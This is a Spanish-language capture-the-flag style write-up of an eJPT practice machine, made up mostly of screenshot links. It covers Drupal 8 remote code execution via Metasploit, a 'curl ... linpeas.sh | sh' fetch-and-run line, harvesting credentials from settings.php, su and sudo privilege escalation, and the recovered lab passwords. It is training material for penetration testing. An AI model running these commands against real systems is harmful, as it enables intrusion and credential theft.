- --
- Tags: #ejptmachine #metasploit #drupal #linpeas #reverseshell 
---

![Pasted image 20250223132824](../../Fotos/Pasted%20image%2020250223132824.png)
- Drupal 8

![Pasted image 20250223132850](../../Fotos/Pasted%20image%2020250223132850.png)

Si damos click en User Guide
![Pasted image 20250223133101](../../Fotos/Pasted%20image%2020250223133101.png)
- Vemos que corre un drupal

También lo vemos mas abajo en la web
![Pasted image 20250223133132](../../Fotos/Pasted%20image%2020250223133132.png)

![Pasted image 20250223132913](../../Fotos/Pasted%20image%2020250223132913.png)

![Pasted image 20250223133151](../../Fotos/Pasted%20image%2020250223133151.png)

![Pasted image 20250223133233](../../Fotos/Pasted%20image%2020250223133233.png)

![Pasted image 20250223133436](../../Fotos/Pasted%20image%2020250223133436.png)

![Pasted image 20250223133853](../../Fotos/Pasted%20image%2020250223133853.png)

![Pasted image 20250223134020](../../Fotos/Pasted%20image%2020250223134020.png)

*Costo tener la RCE pero era por que habia que habilitar una shell en meterpreter con `shell`*
![Pasted image 20250223135006](../../Fotos/Pasted%20image%2020250223135006.png)

![Pasted image 20250223135034](../../Fotos/Pasted%20image%2020250223135034.png)

![Pasted image 20250223135240](../../Fotos/Pasted%20image%2020250223135240.png)

![Pasted image 20250223135324](../../Fotos/Pasted%20image%2020250223135324.png)

----

### Forma 1 de encontrar clave

`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
![Pasted image 20250223135802](../../Fotos/Pasted%20image%2020250223135802.png)
- ballenitafeliz

-----

### Forma 2 de encontrar clave investigacion drupal

Si hacemos una busqueda del archivo settings.php el cual es un archivo en Drupal de configuracion que contiene ajustes esenciales para el funcionamiento del sitio web y en el cual podemos encontrar credenciales, notaremos que el archivo esta en la ruta `/var/www/html/sites/default/settings.php`

![Pasted image 20250223140444](../../Fotos/Pasted%20image%2020250223140444.png)
- ballenitafeliz

Hay que ahcer tratamiento de tty y ahi nos permite ya hacer uso del comando `su` para cambiar de usuario
![Pasted image 20250223140731](../../Fotos/Pasted%20image%2020250223140731.png)

![Pasted image 20250223141616](../../Fotos/Pasted%20image%2020250223141616.png)

`sudo -u root /bin/ls /root/`
![Pasted image 20250223141729](../../Fotos/Pasted%20image%2020250223141729.png)

`sudo grep '' /root/secretitomaximo.txt`
![Pasted image 20250223141804](../../Fotos/Pasted%20image%2020250223141804.png)
- nobodycanfindthispasswordrootrocks

![Pasted image 20250223141827](../../Fotos/Pasted%20image%2020250223141827.png)

